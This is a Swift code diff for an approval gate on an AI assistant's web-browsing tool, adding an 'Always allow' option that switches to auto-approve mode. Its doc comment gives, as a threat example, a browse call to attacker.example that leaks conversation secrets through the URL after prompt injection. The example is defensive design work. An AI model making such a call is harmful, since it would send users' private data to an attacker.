@@ -7,11 +7,10 @@ import Observation
 /// `browse("https://attacker.example/?leak=<secrets>")` would exfiltrate
 /// conversation data to a public host that no SSRF check can block (the host
 /// *is* public). The only real defence is that the user SEES and approves the
-/// exact URL before any request runs. Mirrors ChatGPT's "Allow once / Don't
-/// allow": there is no per-URL "always allow" (URLs vary every call); a
-/// prominent Settings switch (**Auto-approve all browsing**) turns the gate off
-/// for unattended use. Default is ``Mode/ask``; only that coarse mode is
-/// persisted.
+/// exact URL before any request runs. The prompt offers "Allow once" or
+/// "Always allow"; the latter enables the same persisted, coarse browsing mode
+/// exposed in Settings. Private and local destinations remain blocked by the
+/// SSRF guard in either mode. Default is ``Mode/ask``.
 @MainActor
 @Observable
 final class BrowseApprovalStore {
@@ -110,6 +109,15 @@ final class BrowseApprovalStore {
         pendingRequest = nil
         pendingContinuation?.resume(returning: decision)
         pendingContinuation = nil
+    }
+
+    /// Approve the pending fetch and remember that future public web fetches
+    /// should not prompt. This deliberately reuses ``mode`` rather than keeping
+    /// a second preference that could drift from the Settings toggle.
+    func alwaysAllow() {
+        guard pendingRequest != nil else { return }
+        mode = .autoApproveAll
+        answer(.allowOnce)
     }
 
     /// Collapse a URL to a single capped line for the dialog body. Explicit
